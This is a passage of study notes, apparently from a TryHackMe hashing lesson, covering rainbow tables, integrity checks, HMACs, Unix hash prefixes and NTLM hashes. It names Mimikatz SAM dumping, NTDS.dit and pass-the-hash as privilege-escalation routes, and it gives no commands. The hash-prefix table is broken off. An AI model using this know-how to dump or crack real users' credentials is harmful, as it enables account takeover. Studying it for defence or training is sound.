means if someone cracks that hash, they get into more than one account.
It also means that someone can create a "Rainbow table" to break the
hashes.  
A rainbow table is a lookup table of hashes to plaintexts, so you can
quickly find out what password a user had just from the hash. A rainbow
table trades time taken to crack a hash for hard disk space, but they do
take time to create.  
Here's a quick example so you can try and understand what they're
like.  
  
  

## Integrity Checking

  
Hashing can be used to check that files haven't been changed. If you put
the same data in, you always get the same data out. If even a single bit
changes, the hash will change a lot. This means you can use it to check
that files haven't been modified or to make sure that they have
downloaded correctly. You can also use hashing to find duplicate files,
if two pictures have the same hash then they are the same picture.  
  

## HMACs

  
HMAC is a method of using a cryptographic hashing function to verify the
authenticity and integrity of data. The TryHackMe VPN uses HMAC-SHA512
for message authentication, which you can see in the terminal output. A
HMAC can be used to ensure that the person who created the HMAC is who
they say they are (authenticity), and that the message hasnâ€™t been
modified or corrupted (integrity). They use a secret key, and a hashing
algorithm in order to produce a hash.  
  
  
  
• identifying hashes  
<https://hashcat.net/wiki/doku.php?id=example_hashes>  
  
Unix style password hashes are very easy to recognise, as they have a
prefix. The prefix tells you the hashing algorithm used to generate the
hash. The standard format is`$format$rounds$salt$hash`.  
  
  
On Windows, password hashes are stored in the SAM. Windows tries to
prevent normal users from dumping them, but tools like mimikatz exist
for this. Importantly, the hashes found there are split into NT hashes
and LM hashes.  
  
  
Here's a quick table of the most Unix style password prefixes that
you'll see.  

<table class="table">
<thead>
<tr class="header">
<th>Prefix</th>
<th>Algorithm</th>

<tbody>
<tr class="odd">

# Some Type of Hashes

  

### NTHash / NTLM

  
NThash is the hash format that modern Windows Operating System machines
will store user and service passwords in. It's also commonly referred to
as "NTLM" which references the previous version of Windows format for
hashing passwords known as "LM", thus "NT/LM".  
A little bit of history, the NT designation for Windows products
originally meant "New Technology", and was used- starting with [Windows
NT](https://en.wikipedia.org/wiki/Windows_NT), to denote products that
were not built up from the MS-DOS Operating System. Eventually, the "NT"
line became the standard Operating System type to be released by
Microsoft and the name was dropped, but it still lives on in the names
of some Microsoft technologies.   
You can acquire NTHash/NTLM hashes by dumping the SAM database on a
Windows machine, by using a tool like Mimikatz or from the Active
Directory database: NTDS.dit. You may not have to crack the hash to
continue privilege escalation- as you can often conduct a "pass the
hash" attack instead, but sometimes hash cracking is a viable option if
there is a weak password policy.
